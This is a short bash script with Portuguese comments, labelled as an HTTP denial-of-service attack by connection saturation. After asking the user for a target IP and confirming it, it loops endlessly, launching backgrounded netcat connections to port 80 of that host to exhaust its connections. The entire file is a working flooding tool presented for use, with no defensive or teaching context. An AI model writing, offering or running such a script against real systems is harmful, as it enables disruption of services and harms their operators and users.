#!/bin/bash
#
# ATAQUE DE NEGACAO DE SERVICO HTTP POR
# SATURACAO DE CONEXOES HTTP
#
f_loop () {
	 nc $IP 80 &
} 

#
COUNT=0
while [ $COUNT -eq 0 ]; do
	#echo -e -n "QUAL A PORTA VOCE QUER SE CONECTAR USANDO TCP?: "; read PORT
	echo -e -n "QUAL O IP QUE QUER SE CONECTAR?: "; read IP
	echo -e -n "AS INFORMACOES ESTAO CORRETAS? [s/n]: "; read CORRETO
	case $CORRETO in
		s|S)
			echo -e "VOCE DIGITOU= [ IP: $IP ]  "; sleep 3
			break
			;;
		n|N)
			echo -e "TENTE NOVAMENTE ..."; sleep 3
			;;
		*)
			echo -e "INFORMACAO INCORRENTA... TENTA NOVAMENTE..."; sleep 3
			;;
	esac
done

while true; do
	f_loop
done

exit 0

